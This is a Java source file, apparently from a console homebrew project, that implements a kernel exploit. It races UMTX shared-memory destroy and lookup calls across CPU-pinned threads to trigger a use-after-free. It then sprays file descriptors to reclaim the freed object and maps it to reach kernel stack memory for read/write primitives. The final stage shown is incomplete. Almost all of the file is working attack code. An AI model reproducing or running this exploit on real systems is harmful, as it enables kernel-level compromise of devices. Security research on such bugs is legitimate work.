package org.homebrew.umtx;

import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;

import org.homebrew.LoggingUI;
import org.homebrew.NativeMemory;
import org.homebrew.libkernel;

public class Exploit {
    // Constants
    private static final int UMTX_OP_SHM = 26; // 25 on BSD
    private static final int UMTX_SHM_CREAT = 0x0001;
    private static final int UMTX_SHM_LOOKUP = 0x0002;
    private static final int UMTX_SHM_DESTROY = 0x0004;

    private static final int CPU_SETSIZE = 16;
    private static final int CPU_LEVEL_WHICH = 3;
    private static final int CPU_WHICH_TID = 1;

    private static final short RTP_PRIO_REALTIME = 2;
    private static final int RTP_SET = 1;

    private static final int OFFSET_STAT_SIZE = 0x48;

    private static final int PROT_READ = 0x1;
    private static final int PROT_WRITE = 0x2;
    private static final int MAP_SHARED = 0x1;

    // Configuration for race
    private static final short MAIN_TREAD_CORE = 0;
    private static final short MAIN_TREAD_PRIO = 256;
    private static final short[] DESTROYER_TREAD_CORE = new short[] { 1, 2 };
    private static final short[] DESTROYER_TREAD_PRIO = new short[] { 256, 256 };
    private static final short LOOKUP_TREAD_CORE = 3;
    private static final short LOOKUP_TREAD_PRIO = 767;
    private static final short KPRIM_TREAD_CORE = 4;
    private static final int NUM_RACE_ATTEMPTS = 0x10000;
    private static final int SPRAY_FDS_PER_THREAD = 0x28;

    // Configuration for post exploit
    private static final long PIPE_SLOW_SIZE = 0x10000;

    // UMTX key area
    private long shmKey;
    private long fstatBuf;

    // pid for searching for this process later
    private int ourPid;

    private static int pinToCoreSelf(int core) {
        long mask = NativeMemory.allocateMemory(CPU_SETSIZE);
        NativeMemory.setMemory(mask, CPU_SETSIZE, (byte) 0);
        int byteIdx = core / 8;
        int bitIdx = core % 8;
        NativeMemory.putByte(mask + byteIdx, (byte) (1 << bitIdx));
        return libkernel.cpuset_setaffinity(CPU_LEVEL_WHICH, CPU_WHICH_TID,
                -1, CPU_SETSIZE, mask);
    }

    private static int setRtprioSelf(short value) {
        long prio = NativeMemory.allocateMemory(0x4);
        NativeMemory.setMemory(prio, 0x4, (byte) 0);
        NativeMemory.putShort(prio, RTP_PRIO_REALTIME);
        NativeMemory.putShort(prio + 2, value);
        return libkernel.rtprio_thread(RTP_SET, 0, prio);
    }

    private static int UmtxShmCreate(long key) {
        return libkernel._umtx_op(0, UMTX_OP_SHM, UMTX_SHM_CREAT, key, 0);
    }

    private static int UmtxShmDestroy(long key) {
        return libkernel._umtx_op(0, UMTX_OP_SHM, UMTX_SHM_DESTROY, key, 0);
    }

    private static int UmtxShmLookup(long key) {
        return libkernel._umtx_op(0, UMTX_OP_SHM, UMTX_SHM_LOOKUP, key, 0);
    }

    private static int ShmResizeTag(int fd) {
        return libkernel.ftruncate(fd, fd * 0x4000);
    }

    private static int ShmClose(int fd) {
        return libkernel.close(fd);
    }

    private int GetShmTag(int fd) {
        int returnCode;
        returnCode = libkernel.fstat(fd, fstatBuf);
        if (returnCode != 0) {
            return returnCode;
        }
        long tag = NativeMemory.getLong(fstatBuf + OFFSET_STAT_SIZE) / 0x4000;
        if (tag != (tag & 0x3ff)) {
            tag = fd;
        }
        return (int) tag;
    }

    private static void println(String s) {
        LoggingUI.getInstance().log("    " + s);
    }

    public int prepare() {
        int returnCode = 0;
        // Create a UMTX key area to use, these just have to be valid pointers
        this.shmKey = NativeMemory.allocateMemory(0x1000);
        NativeMemory.setMemory(this.shmKey, 0x1000, (byte) 0);

        // Create buffer for fstat
        this.fstatBuf = NativeMemory.allocateMemory(0x100);
        NativeMemory.setMemory(this.fstatBuf, 0x100, (byte) 0);

        // Pin main thread to core 1 with high prio
        returnCode = pinToCoreSelf(MAIN_TREAD_CORE);
        if (returnCode < 0) {
            println("[+] Failed to pin main thread, returnCode: " + returnCode);
            return returnCode;
        }
        returnCode = setRtprioSelf(MAIN_TREAD_PRIO);
        if (returnCode < 0) {
            println("[+] Failed to set main thread prio, returnCode: " + returnCode);
            return returnCode;
        }
        println("[+] Main thread on cpu: " + libkernel.getCurrentCpu());

        // Get pid for searching for this process later
        this.ourPid = libkernel.getpid();
        println("[+] pid: " + this.ourPid);

        kPrimPrepare();

        return 0;
    }

    class Sychronizer {
        public AtomicBoolean runSignal;
        public AtomicBoolean resetSignal;
        public AtomicBoolean stopSignal;
        public AtomicInteger waitingReadyCounter;
        public AtomicInteger waitingStep2Counter;
        public AtomicInteger waitingResetCounter;
        private int numJobs;

        public Sychronizer(int numJobs) {
            this.numJobs = numJobs;
            runSignal = new AtomicBoolean();
            resetSignal = new AtomicBoolean();
            stopSignal = new AtomicBoolean();
            waitingReadyCounter = new AtomicInteger();
            waitingStep2Counter = new AtomicInteger();
            waitingResetCounter = new AtomicInteger();
        }

        void runWhenAllReady() {
            while (waitingReadyCounter.get() != numJobs) {
                Thread.yield();
            }
            resetSignal.set(false);
            runSignal.set(true);
        }

        void waitStep2() {
            while (waitingStep2Counter.get() != numJobs) {
                Thread.yield();
            }
        }

        void waitAllDone() {
            while (waitingResetCounter.get() != numJobs) {
                Thread.yield();
            }
        }

        void stop() {
            stopSignal.set(true);
            reset();
        }

        void reset() {
            waitingReadyCounter.set(0);
            waitingStep2Counter.set(0);
            waitingResetCounter.set(0);
            runSignal.set(false);
            resetSignal.set(true);
        }
    }

    class SynchronizedRepeatableJob implements Runnable {
        protected String name;
        private short core;
        private short prio;
        private Sychronizer sync;

        public SynchronizedRepeatableJob(String name, short core, short prio, Sychronizer sync) {
            this.name = name;
            this.core = core;
            this.prio = prio;
            this.sync = sync;
        }

        @Override
        public void run() {
            prepare();
            loop();
        }

        private void prepare() {
            int returnCode;
            println("[+] " + this.name + ": pinning thread to " + this.core);
            returnCode = pinToCoreSelf(this.core);
            if (returnCode < 0) {
                println("[+] " + this.name + ": failed to pin thread, returnCode: " + returnCode);
            }
            println("[+] " + this.name + ": setting prio " + this.prio);
            returnCode = setRtprioSelf(this.prio);
            if (returnCode < 0) {
                println("[+] " + this.name + ": failed to set prio, returnCode: " + returnCode);
            }
            println("[+] " + this.name + ": prepaired on cpu " + libkernel.getCurrentCpu());
        }

        private void loop() {
            while (!sync.stopSignal.get()) {
                sync.waitingReadyCounter.incrementAndGet();
                while (!sync.runSignal.get()) {
                    Thread.yield();
                }
                // println("[+] " + this.name + ": work");
                work();
                sync.waitingStep2Counter.incrementAndGet();
                sync.waitStep2();
                // println("[+] " + this.name + ": work2");
                work2();
                sync.waitingResetCounter.incrementAndGet();
                // println("[+] " + this.name + ": waiting for reset");
                while (!sync.resetSignal.get()) {
                    Thread.yield();
                }
                // println("[+] " + this.name + ": resetting");
            }
            // println("[+] " + this.name + ": finished");
        }

        protected void work() {
            Thread.yield();
        }

        protected void work2() {
            Thread.yield();
        }
    }

    class DestroyerJob extends SynchronizedRepeatableJob {
        private AtomicInteger destructionsCounter;
        private long shmKey;
        private AtomicInteger lookupFd;
        private int[] sprayFds;
        private long sprayShmKey;

        public DestroyerJob(String name, short core, short prio, Sychronizer sync, AtomicInteger destructionsCounter,
                long shmKey, AtomicInteger lookupFd, long sprayShmKey) {
            super(name, core, prio, sync);
            this.destructionsCounter = destructionsCounter;
            this.shmKey = shmKey;
            this.lookupFd = lookupFd;
            this.sprayFds = new int[SPRAY_FDS_PER_THREAD];
            this.sprayShmKey = sprayShmKey;
        }

        @Override
        protected void work() {
            int result = UmtxShmDestroy(shmKey);
            // println("[+] " + this.name + ": destroyed, result: " + result);
            if (result == 0) {
                this.destructionsCounter.incrementAndGet();
            }
        }

        @Override
        protected void work2() {
            int returnCode;
            if (destructionsCounter.get() == 2 && lookupFd.get() != -1) {
                // println("[+] " + this.name + ": spraying");
                for (int i = 0; i < SPRAY_FDS_PER_THREAD; ++i) {
                    sprayFds[i] = UmtxShmCreate(this.sprayShmKey + i * 0x8);
                    // println("[+] " + this.name + ": created " + sprayFds[i]);
                    returnCode = ShmResizeTag(sprayFds[i]);
                    // println("[+] " + this.name + ": resized, returnCode " + returnCode);
                    returnCode = UmtxShmDestroy(this.sprayShmKey + i * 0x8);
                    // println("[+] " + this.name + ": destroyed, returnCode " + returnCode);
                }
                int reclaimFd = GetShmTag(lookupFd.get());
                // println("[+] " + this.name + ": reclaimFd: " + reclaimFd);
                for (int i = 0; i < SPRAY_FDS_PER_THREAD; ++i) {
                    if (sprayFds[i] != reclaimFd) {
                        ShmClose(sprayFds[i]);
                    }
                }
            }
        }
    }

    class LookupJob extends SynchronizedRepeatableJob {
        private AtomicInteger lookupFd;
        private long shmKey;

        public LookupJob(String name, short core, short prio, Sychronizer sync, AtomicInteger lookupFd, long shmKey) {
            super(name, core, prio, sync);
            this.lookupFd = lookupFd;
            this.shmKey = shmKey;
        }

        @Override
        protected void work() {
            int result = UmtxShmLookup(shmKey);
            // println("[+] " + this.name + ": looked up, result: " + result);
            lookupFd.set(result);
        }
    }

    public class RaceResult {
        public int returnCode;
        public int numTries;
        public int lookupFd;
        public int reclaimFd;
    
        public RaceResult(int returnCode) {
            this.returnCode = returnCode;
        }
    
        public RaceResult(int numTries, int lookupFd, int reclaimFd) {
            this.returnCode = 0;
            this.numTries = numTries;
            this.lookupFd = lookupFd;
            this.reclaimFd = reclaimFd;
        }
    }

    public RaceResult race() {
        Sychronizer destroyerLookupSync = new Sychronizer(3);
        AtomicInteger destructionsCounter = new AtomicInteger();
        AtomicInteger lookupFd = new AtomicInteger();
        int reclaimFd = -1;
    
        DestroyerJob[] destroyerJobs = new DestroyerJob[2];
        Thread[] destroyerThreads = new Thread[2];
        for (int i = 0; i < 2; i++) {
            destroyerJobs[i] = new DestroyerJob("destroyer[" + i + "]", DESTROYER_TREAD_CORE[i],
                    DESTROYER_TREAD_PRIO[i], destroyerLookupSync, destructionsCounter, this.shmKey, lookupFd,
                    this.shmKey + 0x8 * (SPRAY_FDS_PER_THREAD * i + 1));
            destroyerThreads[i] = new Thread(destroyerJobs[i]);
        }
        for (int i = 0; i < 2; i++) {
            destroyerThreads[i].start();
        }

        LookupJob lookupJob = new LookupJob("lookup", LOOKUP_TREAD_CORE, LOOKUP_TREAD_PRIO, destroyerLookupSync,
                lookupFd, this.shmKey);
        Thread lookupThread = new Thread(lookupJob);
        lookupThread.start();
        int numAttemts = 0;
        int numDC2 = 0;
        int numSprays = 0;

        for (int attempt = 0; attempt < NUM_RACE_ATTEMPTS; ++attempt) {
            numAttemts++;
            // println("[+] attempt " + attempt);
            // prepare
            int descriptor = UmtxShmCreate(this.shmKey);
            // println("[+] created descriptor " + descriptor);
            int returnCode;
            returnCode = ShmResizeTag(descriptor);
            // println("[+] ShmResizeTag returned " + returnCode);
            returnCode = ShmClose(descriptor);
            // println("[+] ShmClose returned " + returnCode);

            // run
            destroyerLookupSync.runWhenAllReady();

            // check
            destroyerLookupSync.waitAllDone();
            if (destructionsCounter.get() == 2) {
                numDC2++;
            }
            // println("[+] destructionsCounter: " + destructionsCounter.get());
            // if (lookupFd.get() == -1) {
            //     println("[+] lookup failed");
            // } else {
            //     println("[+] lookup succeeded, lookupFd: " + lookupFd.get());
            // }
            if (destructionsCounter.get() == 2 && lookupFd.get() != -1) {
                numSprays++;
                // println("[+] destructionsCounter: " + destructionsCounter.get() + ", lookupFd: " + lookupFd.get());
                reclaimFd = GetShmTag(lookupFd.get());
                // println("[+] reclaimFd: " + reclaimFd);
                if (reclaimFd != lookupFd.get()) {
                    println("[+] reclaimed: " + reclaimFd + " != " + lookupFd.get());
                    println("[+] Race succeeded, numAttemts: " + numAttemts + ", numDC2: " + numDC2 + ", numSprays: " + numSprays);
                    destroyerLookupSync.stop();
                    return new RaceResult(attempt + 1, lookupFd.get(), (int) reclaimFd);
                }
            }
            destructionsCounter.set(0);

            // finalize
            if (lookupFd.get() != -1) {
                // println("[+] closing not reclaimed lookupFd: " + lookupFd);
                returnCode = ShmClose(lookupFd.get());
                // println("[+] ShmClose(lookupFd.get()) returned " + returnCode);
            }
            if (attempt + 1 == NUM_RACE_ATTEMPTS) {
                destroyerLookupSync.stop();
            } else {
                destroyerLookupSync.reset();
            }
        }
        println("[+] Race failed, numAttemts: " + numAttemts + ", numDC2: " + numDC2 + ", numSprays: " + numSprays);
        return new RaceResult(-1);
    }

    private static final int KPRIM_NOP   = 0;
    private static final int KPRIM_READ  = 1;
    private static final int KPRIM_WRITE = 2;
    private static final int KPRIM_BUF_SIZE = 0x8;
    private static final int NUM_KPRIM_THREADS = 0x200;

    class KPrimThreadData {
        public AtomicBoolean neoFound;
        public AtomicInteger neo;
        public AtomicBoolean resetSignal;
        public AtomicInteger cmd;
        public AtomicInteger uaddr;
        public AtomicInteger kaddr;
        public AtomicInteger readCounter;
        public AtomicInteger writeCounter;
    
        // Pipe for read/write prim via stack reads/writes
        public long pipeSlowFds;
        public int pipeSlowReadFd;
        public int pipeSlowWriteFd;
        public long pipeSlowScratchBuf;

        KPrimThreadData() {
            this.neoFound = new AtomicBoolean();
            this.neo = new AtomicInteger();
            this.resetSignal = new AtomicBoolean();
            this.cmd = new AtomicInteger();
            this.uaddr = new AtomicInteger();
            this.kaddr = new AtomicInteger();
            this.readCounter = new AtomicInteger();
            this.writeCounter = new AtomicInteger();

            // Create pipe for read/write prim via stack reads/writes
            this.pipeSlowFds = NativeMemory.allocateMemory(8);
            int returnCode = libkernel.pipe(this.pipeSlowFds);
            if (returnCode < 0) {
                println("[+] Failed to create pipe, returnCode: " + returnCode);
            }
            this.pipeSlowReadFd = NativeMemory.getInt(this.pipeSlowFds);
            this.pipeSlowWriteFd = NativeMemory.getInt(this.pipeSlowFds + 4);
            this.pipeSlowScratchBuf = NativeMemory.allocateMemory(PIPE_SLOW_SIZE);
        }
    }

    class KPrimJob implements Runnable {
        private int id;
        private short core;
        private KPrimThreadData threadData;
        public AtomicBoolean runSignal;
        public AtomicBoolean exitSignal;

        private long cookie;
        private long cookieBuf;
        private long timeoutBuf;

        public KPrimJob(int id, short core, KPrimThreadData threadData) {
            this.id = id;
            this.core = core;
            this.threadData = threadData;
            this.exitSignal = new AtomicBoolean();
            cookie = (0x13370000 + id) << 32;
            cookieBuf = NativeMemory.allocateMemory(0x8);
            timeoutBuf = NativeMemory.allocateMemory(0x10);
        }

        @Override
        public void run() {
            prepare();
            loop();
        }

        private void prepare() {
            int returnCode;
            // println("[+] kprim[" + this.id + "]: pinning thread to " + this.core);
            returnCode = pinToCoreSelf(this.core);
            if (returnCode < 0) {
                println("[+] kprim[" + this.id + "]: failed to pin thread, returnCode: " + returnCode);
            }
            // println("[+] kprim[" + this.id + "]: prepaired on cpu " + libkernel.getCurrentCpu());
        }

        private void loop() {
            while (!exitSignal.get()) {
                if (threadData.neoFound.get()) {
                    if (threadData.neo.get() != id) {
                        println("[+] kprim[" + this.id + "]: neo found, not me, exiting");
                        exitSignal.set(false);
                        return;
                    }
                }
                NativeMemory.putLong(cookieBuf, cookie);
                libkernel.select(1, cookieBuf, 0, 0, timeoutBuf);

                int cmd = threadData.cmd.get();
                if (cmd == KPRIM_NOP) {
                    Thread.yield();
                    continue;
                }
                threadData.cmd.set(KPRIM_NOP);

                switch (cmd) {
                    case KPRIM_READ:
                        // println("[+] kprim[" + this.id + "]: reading");
                        long read = libkernel.read(threadData.pipeSlowReadFd, threadData.pipeSlowScratchBuf,
                                KPRIM_BUF_SIZE);
                        // println("[+] kprim[" + this.id + "]: read " + read);
                        break;

                    case KPRIM_WRITE:
                        // println("[+] kprim[" + this.id + "]: writing");
                        long write = libkernel.write(threadData.pipeSlowWriteFd, threadData.pipeSlowScratchBuf,
                                KPRIM_BUF_SIZE);
                        // println("[+] kprim[" + this.id + "]: write " + write);
                        break;

                    default:
                        println("[+] kprim[" + this.id + "]: unknown command");
                }

                // println("[+] kprim[" + this.id + "]: waiting for reset");
                while (!threadData.resetSignal.get()) {
                    Thread.yield();
                }
                // println("[+] kprim[" + this.id + "]: resetting");
            }
            // println("[+] kprim[" + this.id + "]: finished");
        }
    }

    private KPrimThreadData kPrimThreadData;
    private KPrimJob[] kPrimJobs;
    private Thread[] kPrimThreads;

    private void kPrimPrepare() {
        kPrimThreadData = new KPrimThreadData();
        kPrimJobs = new KPrimJob[NUM_KPRIM_THREADS];
        kPrimThreads = new Thread[NUM_KPRIM_THREADS];
        for (int i = 0; i < NUM_KPRIM_THREADS; ++i) {
            kPrimJobs[i] = new KPrimJob(i, KPRIM_TREAD_CORE, kPrimThreadData);
            kPrimThreads[i] = new Thread(kPrimJobs[i]);
        }
    }

    public class RWResult {
        public int returnCode;
    
        public RWResult(int returnCode) {
            this.returnCode = returnCode;
        }
    }

    public RWResult getRW(int lookupFd, int reclaimFd) {
        int returnCode;

        // Why it is needed?
        long extraKey = NativeMemory.allocateMemory(0x80);
        int extraFd = UmtxShmCreate(extraKey);
        println("[+] Created extra user mutex: " + extraFd);

        // We have 2 fd referencing a shmfd which will be free'd if we close 1 fd...do that
        returnCode = ShmClose(reclaimFd);
        println("[+] Closed reclaimFd, returnCode: " + returnCode);

        // mmap using the remaining fd to reference the free'd but still initialized vmobject.
        long kstack = libkernel.mmap(0, 0x4000, PROT_READ | PROT_WRITE,
                MAP_SHARED, lookupFd, 0);
        if (kstack < 0) {
            println("[+] Unable to mmap lookupFd, kstack: " + kstack);
            return new RWResult(-1);
        }
        println("[+] kstack: 0x" + Long.toHexString(kstack));

        for (int i = 0; i < NUM_KPRIM_THREADS; ++i) {
            println("[+] Starting kPrimThreads[" + i + "]");
            kPrimThreads[i].start();
            println("[+] Started kPrimThreads[" + i + "]");
        }
        println("[+] Started kprim threads");

        int kstackValid = 0;
        for (int i = 0; i < 0x1000; i += 0x8) {
            long test_qword = NativeMemory.getInt(kstack + 0x3000 + i);
            if (test_qword != 0) {
                kstackValid = 1;
                break;
            }
        }

        if (kstackValid == 0) {
            println("[+] Failed to reclaim with kernel stack, halting");
            return new RWResult(-2);
        }

        return new RWResult(-1);
    }
}
